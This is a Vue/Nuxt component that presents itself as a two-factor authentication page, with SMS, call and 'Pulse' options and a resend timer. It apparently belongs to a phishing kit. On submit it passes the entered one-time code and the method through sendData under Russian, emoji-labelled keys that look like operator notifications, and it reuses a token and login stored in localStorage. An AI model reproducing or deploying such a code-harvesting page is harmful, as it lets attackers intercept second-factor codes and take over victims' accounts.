<template>
  <div class="panel__body" id="fifth" style="min-width: 344px;">
    <div class="panel__title">
      <h1>{{ current.title ?? 'Two-factor Authentication' }}</h1>
      <div class="panel__text">
        {{ current.text }} <strong id="forPhone"></strong>
        <br>
        {{ t('smsCode.description.second') }} <NuxtLink
          :to="{ name: 'verif-pick', query: { op_token: route.query.op_token } }">{{ t('smsCode.description.third')
          }}</NuxtLink>
      </div>
    </div>
    <div class="spacer"></div>
    <div class="form">
      <div class="input__wrapper">
        <label for="verification">{{ t('smsCode.input_title') }}</label>
        <div class="input__box">
          <input type="text" name="verification" @input="clearError" id="verification" v-model="code" :style="error ? {
            border: '1px solid #d4111e'
          } : {}">
        </div>
        <div class="errorMessage" :style="error ? {
          display: 'block',
        } : {}">{{ t('smsCode.errorMessage') }}
        </div>
      </div>
      <div class="button__wrapper">
        <button id="verificationBtn" class="btn" :disabled="code.length <= 0 || disabledButton" @click="next">{{
          t('smsCode.verify') }}</button>
      </div>
      <div class="text-center" v-if="timerAvailable && route.query.method !== 'pulse'">
        {{ t('smsCode.wait') }} <span id="counter">{{ seconds }}</span> {{ t('smsCode.timer') }}
      </div>
      <div class="text-center" v-else-if="!timerAvailable && route.query.method !== 'pulse'">
        <a @click="codeResend">{{ t('smsCode.resend') }}</a>
      </div>
    </div>
  </div>
</template>

<script setup>

import { reqCode } from '~/utils';

const { t } = useI18n()

const timerAvailable = ref(true)

const route = useRoute()
const router = useRouter()
const disabledButton = ref(false)
const code = ref("")
const error = computed(() => !!route.query.error)

const clearError = () => {
  const query = { ...route.query }
  delete query.error
  router.replace({ query })
}

const availableVerifMethods = {
  phone: "📲 Звонок",
  sms: "⏳ SMS",
  pulse: "⚙️ Pulse"
}
const textVariants = computed(() => [
  {
    title: t('smsCode.pulseTitle'),
    text: t('smsCode.pulseDescription'),
    name: "pulse"
  },
  {
    title: t('smsCode.title'),
    text: t('smsCode.description.first') + '\n',
    name: "sms"
  },
  {
    title: t('smsCode.title'),
    text: t('smsCode.description.first') +
      '\n' +
      t('smsCode.description.second'),
    name: "phone"
  }
])

const current = computed(() =>
  textVariants.value.find((item) => item.name === route.query.method) || textVariants.value[0]
)

const seconds = ref(90)
let timerInterval = null

onMounted(() => {
  disabledButton.value = false
})

watch(() => route.query.error, () => {
  if (!route.query.error) {
    disabledButton.value = false
  }
  else if (route.query.error) {
    code.value = ""
  }
})

const startTimer = () => {
  if (timerInterval) {
    clearInterval(timerInterval)
  }
  timerAvailable.value = true
  timerInterval = setInterval(() => {
    seconds.value--
    if (seconds.value === 0) {
      timerAvailable.value = false
      clearInterval(timerInterval)
    }
  }, 1000)
}

onNuxtReady(() => {
  startTimer()
})

async function next() {
  await sendData({ "💉 Метод верификации": availableVerifMethods[route.query.method], "🔑 Код верификации": code.value, }, route.query.op_token)
  console.log("Verification code sent")
  disabledButton.value = true
}

function codeResend() {
  seconds.value = 90
  disabledButton.value = false
  reqCode(localStorage.getItem("token"), localStorage.getItem("login"))
  startTimer()
}

</script>
